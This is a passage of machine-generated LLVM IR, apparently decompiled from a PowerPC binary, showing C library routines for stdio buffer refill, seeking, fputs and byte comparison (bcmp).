  %v2_10026b24 = sub nsw i32 -1, %v4_10026b1c
  %v3_10026b24 = add i32 %v2_10026b08, %v2_10026b24
  %v5_10026b24 = zext i1 %v6_10026b20 to i32
  %v6_10026b24 = add i32 %v3_10026b24, %v5_10026b24
  store i32 %v6_10026b24, i32* %v1_10026b08, align 4
  %v0_10026b2c = load i32, i32* @r10, align 4
  %v1_10026b2c = load i32, i32* @r8, align 4
  %v2_10026b2c = add i32 %v1_10026b2c, 4
  %v3_10026b2c = inttoptr i32 %v2_10026b2c to i32*
  store i32 %v0_10026b2c, i32* %v3_10026b2c, align 4
  %v0_10026b30 = load i32, i32* @r8, align 4
  %v1_10026b30 = inttoptr i32 %v0_10026b30 to i32*
  %v2_10026b30 = load i32, i32* %v1_10026b30, align 4
  %v1_10026b34 = load i32, i32* %r4.global-to-local, align 4
  %v3_10026b34 = icmp sgt i32 %v2_10026b30, %v1_10026b34
  br i1 %v3_10026b34, label %dec_label_pc_10026b4c, label %dec_label_pc_10026b3c

dec_label_pc_10026b3c:                            ; preds = %dec_label_pc_10026af0
  %v4_10026b34 = icmp eq i32 %v2_10026b30, %v1_10026b34
  br i1 %v4_10026b34, label %dec_label_pc_10026b40, label %dec_label_pc_10026b50thread-pre-split

dec_label_pc_10026b40:                            ; preds = %dec_label_pc_10026b3c
  %v1_10026b40 = add i32 %v0_10026b30, 4
  %v2_10026b40 = inttoptr i32 %v1_10026b40 to i32*
  %v3_10026b40 = load i32, i32* %v2_10026b40, align 4
  %v1_10026b44 = load i32, i32* %r5.global-to-local, align 4
  %v3_10026b44 = icmp ugt i32 %v3_10026b40, %v1_10026b44
  br i1 %v3_10026b44, label %dec_label_pc_10026b4c, label %dec_label_pc_10026b50thread-pre-split

dec_label_pc_10026b4c:                            ; preds = %dec_label_pc_10026b40, %dec_label_pc_10026af0
  %v0_10026b4c = load i32, i32* %r31.global-to-local, align 4
  %v1_10026b4c = sub i32 0, %v0_10026b4c
  store i32 %v1_10026b4c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b50

dec_label_pc_10026b50thread-pre-split:            ; preds = %dec_label_pc_10026b3c, %dec_label_pc_10026b40
  %v0_10026b50.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b50

dec_label_pc_10026b50:                            ; preds = %dec_label_pc_10026b50thread-pre-split, %dec_label_pc_10026b4c
  %v0_10026b50 = phi i32 [ %v0_10026b50.pr, %dec_label_pc_10026b50thread-pre-split ], [ %v1_10026b4c, %dec_label_pc_10026b4c ]
  %tmp8 = icmp sgt i32 %v0_10026b50, -1
  br i1 %tmp8, label %dec_label_pc_10026b6c, label %dec_label_pc_10026b58

dec_label_pc_10026b58:                            ; preds = %dec_label_pc_10026b50
  %v0_10026b58 = call i32 @__errno_location()
  %v2_10026b60 = inttoptr i32 %v0_10026b58 to i32*
  store i32 75, i32* %v2_10026b60, align 4
  %v0_10026b70.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b6c

dec_label_pc_10026b68:                            ; preds = %dec_label_pc_10026ac4, %dec_label_pc_10026abc
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10026b6c

dec_label_pc_10026b6c:                            ; preds = %dec_label_pc_10026b50, %dec_label_pc_10026b58, %dec_label_pc_10026b68
  %v0_10026b70 = phi i32 [ %v0_10026b50, %dec_label_pc_10026b50 ], [ %v0_10026b70.pre, %dec_label_pc_10026b58 ], [ -1, %dec_label_pc_10026b68 ]
  ret i32 %v0_10026b70

; uselistorder directives
  uselistorder i32 %v2_10026b30, { 1, 0 }
  uselistorder i32 %v2_10026b14, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 -2, { 19, 20, 6, 5, 1, 13, 3, 7, 21, 22, 12, 30, 2, 9, 10, 11, 23, 24, 25, 14, 27, 28, 26, 29, 18, 8, 0, 4, 15, 16, 17 }
  uselistorder i32 2048, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10026b6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026b50thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10026af0, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10026b84 = load i32, i32* @lr, align 4
  store i32 %v0_10026b84, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10026b98 = add i32 %arg1, 8
  %v2_10026b98 = inttoptr i32 %v1_10026b98 to i32*
  %v3_10026b98 = load i32, i32* %v2_10026b98, align 4
  %v1_10026b9c = add i32 %arg1, 12
  %v2_10026b9c = inttoptr i32 %v1_10026b9c to i32*
  %v3_10026b9c = load i32, i32* %v2_10026b9c, align 4
  %v2_10026ba0 = sub i32 %v3_10026b9c, %v3_10026b98
  store i32 268594088, i32* @lr, align 4
  %v3_10026ba4 = inttoptr i32 %v3_10026b98 to i16*
  %v4_10026ba4 = call i32 @__stdio_READ(i16* %v3_10026ba4, i32 %v2_10026ba0, i32 %v2_10026ba0)
  %v0_10026ba8 = load i32, i32* @r29, align 4
  %v1_10026ba8 = add i32 %v0_10026ba8, 8
  %v2_10026ba8 = inttoptr i32 %v1_10026ba8 to i32*
  %v3_10026ba8 = load i32, i32* %v2_10026ba8, align 4
  %v2_10026bac = add i32 %v3_10026ba8, %v4_10026ba4
  store i32 %v2_10026bac, i32* %r0.global-to-local, align 4
  %v2_10026bb0 = add i32 %v0_10026ba8, 16
  %v3_10026bb0 = inttoptr i32 %v2_10026bb0 to i32*
  store i32 %v3_10026ba8, i32* %v3_10026bb0, align 4
  %v0_10026bb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10026bb4 = load i32, i32* @r29, align 4
  %v2_10026bb4 = add i32 %v1_10026bb4, 20
  %v3_10026bb4 = inttoptr i32 %v2_10026bb4 to i32*
  store i32 %v0_10026bb4, i32* %v3_10026bb4, align 4
  store i32 %v0_10026b84, i32* %r0.global-to-local, align 4
  ret i32 %v4_10026ba4

; uselistorder directives
  uselistorder i32 %v3_10026ba8, { 1, 0 }
  uselistorder i32 %v4_10026ba4, { 1, 0 }
  uselistorder i32 %v3_10026b98, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10026bd4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10026be0 = load i16, i16* %arg1, align 2
  %v4_10026be0 = zext i16 %v3_10026be0 to i32
  %v2_10026be4 = and i32 %v4_10026be0, %arg2
  %v5_10026be4 = icmp eq i32 %v2_10026be4, 0
  br i1 %v5_10026be4, label %dec_label_pc_10026bec, label %dec_label_pc_10026bfc

dec_label_pc_10026bec:                            ; preds = %entry
  %v1_10026bec = and i32 %v4_10026be0, 2176
  %v3_10026bec = icmp eq i32 %v1_10026bec, 0
  br i1 %v3_10026bec, label %dec_label_pc_10026bf4, label %dec_label_pc_10026c08

dec_label_pc_10026bf4:                            ; preds = %dec_label_pc_10026bec
  %v2_10026bf4 = or i32 %v4_10026be0, %arg2
  %v1_10026bf8 = trunc i32 %v2_10026bf4 to i16
  store i16 %v1_10026bf8, i16* %arg1, align 2
  %v0_10026bfc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026bfc

dec_label_pc_10026bfc:                            ; preds = %entry, %dec_label_pc_10026bf4
  %v0_10026bfc = phi i32 [ %tmp, %entry ], [ %v0_10026bfc.pre, %dec_label_pc_10026bf4 ]
  %v1_10026bfc = inttoptr i32 %v0_10026bfc to i16*
  %v2_10026bfc = load i16, i16* %v1_10026bfc, align 2
  %v3_10026bfc = zext i16 %v2_10026bfc to i32
  %v1_10026c00 = and i32 %v3_10026bfc, 16
  %v3_10026c00 = icmp eq i32 %v1_10026c00, 0
  br i1 %v3_10026c00, label %dec_label_pc_10026c24, label %dec_label_pc_10026c08

dec_label_pc_10026c08:                            ; preds = %dec_label_pc_10026bec, %dec_label_pc_10026bfc
  %v0_10026c08 = call i32 @__errno_location()
  store i32 %v0_10026c08, i32* %r3.global-to-local, align 4
  %v2_10026c10 = inttoptr i32 %v0_10026c08 to i32*
  store i32 9, i32* %v2_10026c10, align 4
  br label %dec_label_pc_10026c14

dec_label_pc_10026c14:                            ; preds = %dec_label_pc_10026c2c, %dec_label_pc_10026c08
  %v0_10026c14 = load i32, i32* @r31, align 4
  %v1_10026c14 = inttoptr i32 %v0_10026c14 to i16*
  %v2_10026c14 = load i16, i16* %v1_10026c14, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10026c1c = or i16 %v2_10026c14, 8
  br label %dec_label_pc_10026c58

dec_label_pc_10026c24:                            ; preds = %dec_label_pc_10026bfc
  %v1_10026c24 = and i32 %v3_10026bfc, 64
  %v3_10026c24 = icmp eq i32 %v1_10026c24, 0
  br i1 %v3_10026c24, label %dec_label_pc_10026c4c, label %dec_label_pc_10026c2c

dec_label_pc_10026c2c:                            ; preds = %dec_label_pc_10026c24
  store i32 268594224, i32* @lr, align 4
  %v0_10026c2c = call i32 @__stdio_wcommit()
  store i32 %v0_10026c2c, i32* %r3.global-to-local, align 4
  %v3_10026c30 = icmp eq i32 %v0_10026c2c, 0
  br i1 %v3_10026c30, label %dec_label_pc_10026c38, label %dec_label_pc_10026c14

dec_label_pc_10026c38:                            ; preds = %dec_label_pc_10026c2c
  %v0_10026c38 = load i32, i32* @r31, align 4
  %v1_10026c38 = inttoptr i32 %v0_10026c38 to i16*
  %v2_10026c38 = load i16, i16* %v1_10026c38, align 2
  %v3_10026c38 = zext i16 %v2_10026c38 to i32
  %v1_10026c3c = add i32 %v0_10026c38, 8
  %v2_10026c3c = inttoptr i32 %v1_10026c3c to i32*
  %v3_10026c3c = load i32, i32* %v2_10026c3c, align 4
  %v1_10026c40 = call i32 @__asm_rlwinm(i32 %v3_10026c38, i32 0, i32 26, i32 24)
  %v2_10026c40 = trunc i32 %v1_10026c40 to i16
  %v1_10026c44 = load i32, i32* @r31, align 4
  %v2_10026c44 = add i32 %v1_10026c44, 28
  %v3_10026c44 = inttoptr i32 %v2_10026c44 to i32*
  store i32 %v3_10026c3c, i32* %v3_10026c44, align 4
  %v3_10026c48 = load i32, i32* @r31, align 4
  %v4_10026c48 = inttoptr i32 %v3_10026c48 to i16*
  store i16 %v2_10026c40, i16* %v4_10026c48, align 2
  %v0_10026c4c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026c4c

dec_label_pc_10026c4c:                            ; preds = %dec_label_pc_10026c24, %dec_label_pc_10026c38
  %v0_10026c4c = phi i32 [ %v0_10026bfc, %dec_label_pc_10026c24 ], [ %v0_10026c4c.pre, %dec_label_pc_10026c38 ]
  %v1_10026c4c = inttoptr i32 %v0_10026c4c to i16*
  %v2_10026c4c = load i16, i16* %v1_10026c4c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10026c54 = or i16 %v2_10026c4c, 1
  br label %dec_label_pc_10026c58

dec_label_pc_10026c58:                            ; preds = %dec_label_pc_10026c14, %dec_label_pc_10026c4c
  %v2_10026c58 = phi i32 [ %v0_10026c14, %dec_label_pc_10026c14 ], [ %v0_10026c4c, %dec_label_pc_10026c4c ]
  %storemerge.off0 = phi i16 [ %v1_10026c1c, %dec_label_pc_10026c14 ], [ %v1_10026c54, %dec_label_pc_10026c4c ]
  %v3_10026c58 = inttoptr i32 %v2_10026c58 to i16*
  store i16 %storemerge.off0, i16* %v3_10026c58, align 2
  store i32 %v0_10026bd4, i32* @r31, align 4
  %v0_10026c6c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10026c6c

; uselistorder directives
  uselistorder i32 %v4_10026be0, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 4, 2, 3 }
  uselistorder i32 26, { 10, 9, 11, 12, 13, 2, 3, 4, 5, 0, 6, 7, 8, 1 }
  uselistorder i32 ()* @__stdio_wcommit, { 8, 3, 2, 1, 7, 6, 5, 4, 0 }
  uselistorder label %dec_label_pc_10026c58, { 1, 0 }
  uselistorder label %dec_label_pc_10026c4c, { 1, 0 }
  uselistorder label %dec_label_pc_10026c08, { 1, 0 }
  uselistorder label %dec_label_pc_10026bfc, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10026c70 = load i32, i32* @lr, align 4
  store i32 %v0_10026c70, i32* %r0.global-to-local, align 4
  %v0_10026c7c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10026c88 = add i32 %arg1, 4
  %v2_10026c88 = inttoptr i32 %v1_10026c88 to i32*
  %v3_10026c88 = load i32, i32* %v2_10026c88, align 4
  %v2_10026c8c = load i32, i32* %arg2, align 4
  %v1_10026c90 = add i32 %tmp, 4
  %v2_10026c90 = inttoptr i32 %v1_10026c90 to i32*
  %v3_10026c90 = load i32, i32* %v2_10026c90, align 4
  store i32 268594328, i32* @lr, align 4
  %v4_10026c94 = call i32 @__libc_lseek64(i32 %v3_10026c88, i32 %v2_10026c8c, i32 %v3_10026c90, i32 %arg3)
  %v1_10026c98 = icmp slt i32 %v4_10026c94, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10026c98, label %dec_label_pc_10026cb0, label %dec_label_pc_10026ca4

dec_label_pc_10026ca4:                            ; preds = %entry
  %v1_10026ca4 = load i32, i32* @r31, align 4
  %v2_10026ca4 = inttoptr i32 %v1_10026ca4 to i32*
  store i32 %v4_10026c94, i32* %v2_10026ca4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10026cac = load i32, i32* @r31, align 4
  %v2_10026cac = add i32 %v1_10026cac, 4
  %v3_10026cac = inttoptr i32 %v2_10026cac to i32*
  store i32 %tmp, i32* %v3_10026cac, align 4
  %v0_10026cb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10026cb0

dec_label_pc_10026cb0:                            ; preds = %entry, %dec_label_pc_10026ca4
  %v0_10026cb0 = phi i32 [ %tmp, %entry ], [ %v0_10026cb0.pre, %dec_label_pc_10026ca4 ]
  store i32 %v0_10026c70, i32* %r0.global-to-local, align 4
  store i32 %v0_10026c7c, i32* @r31, align 4
  ret i32 %v0_10026cb0

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10026cb0, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10026cd0 = call i32 @__asm_mfcr()
  %v1_10026cd8 = add i32 %arg2, 56
  store i32 %v1_10026cd8, i32* %r30.global-to-local, align 4
  store i32 %v0_10026cd0, i32* @r29, align 4
  %v2_10026cf0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_10026cf4 = add i32 %arg2, 52
  %v2_10026cf4 = inttoptr i32 %v1_10026cf4 to i32*
  %v3_10026cf4 = load i32, i32* %v2_10026cf4, align 4
  %v3_10026d00 = icmp eq i32 %v3_10026cf4, 0
  store i1 %v3_10026d00, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10026d00, label %dec_label_pc_10026d08, label %dec_label_pc_10026d14

dec_label_pc_10026d08:                            ; preds = %entry
  %v4_10026d08 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v1_10026cd8)
  %v0_10026d0c = load i32, i32* %r30.global-to-local, align 4
  store i32 268594452, i32* @lr, align 4
  %v1_10026d10 = call i32 @pthread_mutex_lock(i32 %v0_10026d0c)
  %v0_10026d14.pre = load i32, i32* @r31, align 4
  %v0_10026d18.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10026d14

dec_label_pc_10026d14:                            ; preds = %entry, %dec_label_pc_10026d08
  %v0_10026d18 = phi i32 [ %v0_10026cd0, %entry ], [ %v0_10026d18.pre, %dec_label_pc_10026d08 ]
  %v0_10026d14 = phi i32 [ %arg2, %entry ], [ %v0_10026d14.pre, %dec_label_pc_10026d08 ]
  store i32 268594464, i32* @lr, align 4
  %v2_10026d1c = call i32 @__GI_fputs_unlocked(i32 %v0_10026d18, i32 %v0_10026d14)
  store i32 1, i32* @r4, align 4
  store i32 %v2_10026d1c, i32* @r31, align 4
  store i32 %v2_10026cf0, i32* @r3, align 4
  %v0_10026d2c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10026d2c, label %dec_label_pc_10026d30, label %dec_label_pc_10026d34

dec_label_pc_10026d30:                            ; preds = %dec_label_pc_10026d14
  store i32 268594484, i32* @lr, align 4
  %v0_10026d30 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10026d38.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026d34

dec_label_pc_10026d34:                            ; preds = %dec_label_pc_10026d14, %dec_label_pc_10026d30
  %v0_10026d38 = phi i32 [ %v2_10026d1c, %dec_label_pc_10026d14 ], [ %v0_10026d38.pre, %dec_label_pc_10026d30 ]
  %v1_10026d48 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10026cd0)
  ret i32 %v0_10026d38

; uselistorder directives
  uselistorder i32 %v0_10026cd0, { 1, 0, 2 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 13, 3, 9, 5, 11, 0, 10, 7, 8, 1, 2, 4, 15, 6, 14, 12 }
  uselistorder i32 ()* @__pthread_cleanup_pop_restore, { 5, 4, 38, 2, 26, 24, 23, 22, 21, 20, 40, 39, 37, 36, 35, 1, 0, 7, 34, 33, 6, 32, 31, 19, 18, 17, 16, 15, 14, 13, 25, 30, 3, 12, 11, 29, 28, 27, 10, 9, 8 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 18, 17, 60, 13, 3, 11, 15, 14, 41, 40, 39, 38, 37, 36, 62, 61, 59, 58, 57, 12, 0, 23, 56, 55, 22, 2, 1, 10, 9, 8, 54, 53, 35, 34, 33, 32, 31, 30, 29, 42, 46, 16, 28, 27, 45, 44, 43, 26, 25, 24, 52, 51, 63, 7, 4, 64, 6, 5, 50, 49, 48, 47, 21, 20, 19 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 35, 36, 2, 38, 15, 16, 17, 18, 19, 20, 0, 1, 3, 4, 5, 39, 40, 33, 6, 7, 34, 8, 9, 21, 22, 23, 24, 25, 26, 27, 14, 10, 37, 28, 29, 11, 12, 13, 30, 31, 32 }
  uselistorder i32 ptrtoint (i32* @global_var_10010000.20 to i32), { 2, 3, 4, 5, 6, 7, 8, 23, 9, 10, 12, 11, 13, 1, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), { 6, 21, 2, 7, 8, 9, 10, 11, 12, 22, 13, 14, 3, 15, 16, 4, 17, 18, 23, 24, 19, 25, 0, 5, 1, 26, 27, 20, 29, 28 }
  uselistorder i32 52, { 24, 25, 6, 26, 29, 19, 18, 8, 27, 28, 20, 21, 7, 5, 15, 16, 17, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 0, 22, 23 }
  uselistorder i32 ()* @__asm_mfcr, { 25, 64, 35, 21, 15, 14, 13, 38, 44, 63, 17, 18, 37, 31, 67, 33, 46, 20, 19, 43, 10, 36, 29, 7, 6, 47, 41, 30, 12, 53, 50, 49, 54, 52, 34, 32, 40, 62, 4, 11, 56, 61, 60, 45, 57, 22, 5, 24, 39, 42, 26, 1, 59, 28, 23, 9, 3, 2, 48, 0, 66, 65, 58, 51, 8, 55, 16, 27 }
  uselistorder label %dec_label_pc_10026d34, { 1, 0 }
  uselistorder label %dec_label_pc_10026d14, { 1, 0 }
}

define i32 @bcmp(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v2_10026d54 = icmp ugt i32 %arg1, 15
  %v3_10026d54 = icmp eq i32 %arg1, 15
  store i1 %v3_10026d54, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg1, i32* @r31, align 4
  br i1 %v2_10026d54, label %dec_label_pc_10026d88.preheader, label %dec_label_pc_1002703c

dec_label_pc_10026d88.preheader:                  ; preds = %entry
  %v0_10026d88.pre = load i32, i32* @r4, align 4
  %v0_10026d94.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10026d88

dec_label_pc_10026d6c:                            ; preds = %dec_label_pc_10026d88
  %v1_10026d6c = inttoptr i32 %v0_10026e10 to i8*
  %v2_10026d6c = load i8, i8* %v1_10026d6c, align 1
  %v3_10026d6c = zext i8 %v2_10026d6c to i32
  store i32 %v3_10026d6c, i32* %r9.global-to-local, align 4
  %v1_10026d70 = add i32 %v0_10026d9c, -1
  store i32 %v1_10026d70, i32* @r31, align 4
  %v1_10026d74 = inttoptr i32 %v0_10026e14 to i8*
  %v2_10026d74 = load i8, i8* %v1_10026d74, align 1
  %v3_10026d74 = zext i8 %v2_10026d74 to i32
  store i32 %v3_10026d74, i32* %r0.global-to-local, align 4
  %v1_10026d78 = add i32 %v0_10026e10, 1
  %v1_10026d7c = add i32 %v0_10026e14, 1
  store i32 %v1_10026d7c, i32* @r4, align 4
  %v2_10026d80 = sub nsw i32 %v3_10026d6c, %v3_10026d74
  store i32 %v2_10026d80, i32* %r9.global-to-local, align 4
  %v4_10026d84 = icmp eq i8 %v2_10026d6c, %v2_10026d74
  br i1 %v4_10026d84, label %dec_label_pc_10026d88, label %dec_label_pc_10026ffc

dec_label_pc_10026d88:                            ; preds = %dec_label_pc_10026d88.preheader, %dec_label_pc_10026d6c
  %v0_10026d9c = phi i32 [ %arg1, %dec_label_pc_10026d88.preheader ], [ %v1_10026d70, %dec_label_pc_10026d6c ]
  %v0_10026e10 = phi i32 [ %v0_10026d94.pre, %dec_label_pc_10026d88.preheader ], [ %v1_10026d78, %dec_label_pc_10026d6c ]
  %v0_10026e14 = phi i32 [ %v0_10026d88.pre, %dec_label_pc_10026d88.preheader ], [ %v1_10026d7c, %dec_label_pc_10026d6c ]
  %v1_10026d88 = urem i32 %v0_10026e14, 4
  store i32 %v1_10026d88, i32* %r0.global-to-local, align 4
  %v3_10026d88 = icmp eq i32 %v1_10026d88, 0
  store i32 %v0_10026e14, i32* %r29.global-to-local, align 4
  br i1 %v3_10026d88, label %dec_label_pc_10026d94, label %dec_label_pc_10026d6c

dec_label_pc_10026d94:                            ; preds = %dec_label_pc_10026d88
  %v1_10026d94 = urem i32 %v0_10026e10, 4
  %v3_10026d94 = icmp eq i32 %v1_10026d94, 0
  store i32 %v0_10026e10, i32* @r30, align 4
  %v1_10026d9c = udiv i32 %v0_10026d9c, 4
  store i32 %v1_10026d9c, i32* %r9.global-to-local, align 4
  %v1_10026da4 = urem i32 %v1_10026d9c, 4
  store i32 %v1_10026da4, i32* %r0.global-to-local, align 4
  br i1 %v3_10026d94, label %dec_label_pc_10026da4, label %dec_label_pc_10026ea4

dec_label_pc_10026da4:                            ; preds = %dec_label_pc_10026d94
  %v3_10026dac = icmp eq i32 %v1_10026da4, 1
  store i1 %v3_10026dac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026dac, label %dec_label_pc_10026e04, label %dec_label_pc_10026db4

dec_label_pc_10026db4:                            ; preds = %dec_label_pc_10026da4
  %v1_10026dac = icmp eq i32 %v1_10026da4, 0
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10026dac, label %dec_label_pc_10026df8, label %dec_label_pc_10026dbc

dec_label_pc_10026dbc:                            ; preds = %dec_label_pc_10026db4
  %v3_10026dbc = icmp eq i32 %v1_10026da4, 3
  store i1 %v3_10026dbc, i1* %cr7_eq.global-to-local, align 1
  %v1_10026dc0 = inttoptr i32 %v0_10026e14 to i32*
  %v2_10026dc0 = load i32, i32* %v1_10026dc0, align 4
  %v1_10026dc4 = inttoptr i32 %v0_10026e10 to i32*
  %v2_10026dc4 = load i32, i32* %v1_10026dc4, align 4
  store i32 %v2_10026dc4, i32* %r0.global-to-local, align 4
  br i1 %v3_10026dbc, label %dec_label_pc_10026de4, label %dec_label_pc_10026dcc

dec_label_pc_10026dcc:                            ; preds = %dec_label_pc_10026dbc
  %v1_10026dd0 = add i32 %v0_10026e10, -8
  store i32 %v2_10026dc0, i32* %r0.global-to-local, align 4
  %v1_10026dd8 = add i32 %v0_10026e14, -8
  %v1_10026ddc = add nuw nsw i32 %v1_10026d9c, 2
  br label %dec_label_pc_10026e50

dec_label_pc_10026de4:                            ; preds = %dec_label_pc_10026dbc
  %v1_10026de8 = add i32 %v0_10026e10, -4
  %v1_10026dec = add i32 %v0_10026e14, -4
  %v1_10026df0 = add nuw nsw i32 %v1_10026d9c, 1
  br label %dec_label_pc_10026e40

dec_label_pc_10026df8:                            ; preds = %dec_label_pc_10026db4
  %v1_10026df8 = inttoptr i32 %v0_10026e10 to i32*
  %v2_10026df8 = load i32, i32* %v1_10026df8, align 4
  store i32 %v2_10026df8, i32* %r9.global-to-local, align 4
  %v1_10026dfc = inttoptr i32 %v0_10026e14 to i32*
  %v2_10026dfc = load i32, i32* %v1_10026dfc, align 4
  store i32 %v2_10026dfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10026e28

dec_label_pc_10026e04:                            ; preds = %dec_label_pc_10026da4
  %v1_10026e04 = inttoptr i32 %v0_10026e10 to i32*
  %v2_10026e04 = load i32, i32* %v1_10026e04, align 4
  %v1_10026e08 = add nsw i32 %v1_10026d9c, -1
  %v1_10026e0c = inttoptr i32 %v0_10026e14 to i32*
  %v2_10026e0c = load i32, i32* %v1_10026e0c, align 4
  %v1_10026e10 = add i32 %v0_10026e10, 4
  %v1_10026e14 = add i32 %v0_10026e14, 4
  br label %dec_label_pc_10026e18

dec_label_pc_10026e18:                            ; preds = %dec_label_pc_10026e70, %dec_label_pc_10026e04
  %v0_10026e6860 = phi i32 [ %v1_10026e68, %dec_label_pc_10026e70 ], [ %v1_10026e08, %dec_label_pc_10026e04 ]
  %v0_10026e1c = phi i32 [ %v1_10026e70, %dec_label_pc_10026e70 ], [ %v1_10026e10, %dec_label_pc_10026e04 ]
  %v1_10026e18 = phi i32 [ %v3_10026e58, %dec_label_pc_10026e70 ], [ %v2_10026e0c, %dec_label_pc_10026e04 ]
  %v0_10026e18 = phi i32 [ %v3_10026e54, %dec_label_pc_10026e70 ], [ %v2_10026e04, %dec_label_pc_10026e04 ]
  %storemerge1 = phi i32 [ %v1_10026e74, %dec_label_pc_10026e70 ], [ %v1_10026e14, %dec_label_pc_10026e04 ]
  %v4_10026e18 = icmp eq i32 %v0_10026e18, %v1_10026e18
  store i1 %v4_10026e18, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e1c = inttoptr i32 %v0_10026e1c to i32*
  %v2_10026e1c = load i32, i32* %v1_10026e1c, align 4
  store i32 %v2_10026e1c, i32* %r9.global-to-local, align 4
  %v1_10026e20 = inttoptr i32 %storemerge1 to i32*
  %v2_10026e20 = load i32, i32* %v1_10026e20, align 4
  store i32 %v2_10026e20, i32* %r0.global-to-local, align 4
  br i1 %v4_10026e18, label %dec_label_pc_10026e28, label %dec_label_pc_10026e8c

dec_label_pc_10026e28:                            ; preds = %dec_label_pc_10026e18, %dec_label_pc_10026df8
  %v0_10026e6859 = phi i32 [ %v0_10026e6860, %dec_label_pc_10026e18 ], [ %v1_10026d9c, %dec_label_pc_10026df8 ]
  %v0_10026e30 = phi i32 [ %storemerge1, %dec_label_pc_10026e18 ], [ %v0_10026e14, %dec_label_pc_10026df8 ]
  %v0_10026e2c = phi i32 [ %v0_10026e1c, %dec_label_pc_10026e18 ], [ %v0_10026e10, %dec_label_pc_10026df8 ]
  %v1_10026e38 = phi i32 [ %v2_10026e20, %dec_label_pc_10026e18 ], [ %v2_10026dfc, %dec_label_pc_10026df8 ]
  %v0_10026e38 = phi i32 [ %v2_10026e1c, %dec_label_pc_10026e18 ], [ %v2_10026df8, %dec_label_pc_10026df8 ]
  %v4_10026e28 = icmp eq i32 %v0_10026e38, %v1_10026e38
  store i1 %v4_10026e28, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e2c = add i32 %v0_10026e2c, 4
  %v2_10026e2c = inttoptr i32 %v1_10026e2c to i32*
  %v3_10026e2c = load i32, i32* %v2_10026e2c, align 4
  %v1_10026e30 = add i32 %v0_10026e30, 4
  %v2_10026e30 = inttoptr i32 %v1_10026e30 to i32*
  %v3_10026e30 = load i32, i32* %v2_10026e30, align 4
